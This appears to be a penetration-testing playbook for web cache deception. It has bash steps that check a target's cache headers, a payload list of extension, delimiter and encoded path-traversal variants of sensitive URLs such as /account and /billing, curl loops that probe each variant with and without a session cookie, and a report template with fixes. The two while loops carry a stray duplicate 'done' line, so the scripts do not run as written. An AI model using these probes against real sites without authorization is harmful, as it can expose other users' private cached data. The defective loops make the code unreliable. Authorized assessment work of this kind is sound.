# Web Cache Deception

## Overview
Web cache deception tricks shared caches/CDNs into storing user-specific content
by appending cacheable extensions or path segments to sensitive URLs.

## Prerequisites
```bash
# Optional tooling
# apt-get install -y jq
```

## Phase 1: Identify Caching Layer
```bash
TARGET_URL="https://TARGET"

# Check cache headers
curl -s -I "$TARGET_URL" \
  | tee /workspace/output/TARGET_cache_headers.txt

# Look for: Cache-Control, Age, X-Cache, Via, CF-Cache-Status
rg -n "cache-control|age:|x-cache|via|cf-cache-status" \
  /workspace/output/TARGET_cache_headers.txt \
  > /workspace/output/TARGET_cache_signals.txt
```

## Phase 2: Find Sensitive Paths
```bash
# Examples: /account, /profile, /settings, /billing, /orders
cat > /workspace/output/TARGET_sensitive_paths.txt <<'PATHS'
/account
/profile
/settings
/billing
/orders
PATHS
```

## Phase 3: Cache Deception Payloads
```bash
cat > /workspace/output/TARGET_cache_deception_payloads.txt <<'PAYLOADS'
# Extension-based
/account.css
/profile.js
/settings.png
/orders.json

# Path parameters / delimiter tricks
/account;css
/profile;.css
/settings/%2e%2e%2fsettings.css

# Extra path segment
/account/cache.css/extra
/profile/anything.css
PAYLOADS
```

## Phase 4: Test Cacheability
```bash
# Authenticated request (use your own session cookie)
COOKIE="session=YOUR_SESSION"

while read -r p; do
  curl -s -I "https://TARGET${p}" -H "Cookie: $COOKIE" \
    | tee -a /workspace/output/TARGET_cache_test_headers.txt
  echo "---" >> /workspace/output/TARGET_cache_test_headers.txt
done
done < /workspace/output/TARGET_cache_deception_payloads.txt
```

## Phase 5: Verify Shared Cache Exposure
```bash
# Request same path without auth and compare
while read -r p; do
  curl -s "https://TARGET${p}" \
    | head -c 200 >> /workspace/output/TARGET_cache_test_body.txt
  echo "\n---" >> /workspace/output/TARGET_cache_test_body.txt
done
done < /workspace/output/TARGET_cache_deception_payloads.txt
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Authenticated content cached and served to unauthenticated users

## Evidence
- Headers: /workspace/output/TARGET_cache_test_headers.txt
- Body samples: /workspace/output/TARGET_cache_test_body.txt

## Recommendations
1. Set Cache-Control: private, no-store on sensitive paths
2. Normalize paths and reject unexpected extensions
3. Configure CDN to respect auth cookies
```

## Output Files
- `/workspace/output/TARGET_cache_headers.txt` — baseline headers
- `/workspace/output/TARGET_cache_signals.txt` — cache indicators
- `/workspace/output/TARGET_cache_deception_payloads.txt` — payload list
- `/workspace/output/TARGET_cache_test_headers.txt` — cache test headers
- `/workspace/output/TARGET_cache_test_body.txt` — cache test body samples

indicators: cache deception, web cache deception, cdn cache, cache-control, x-cache
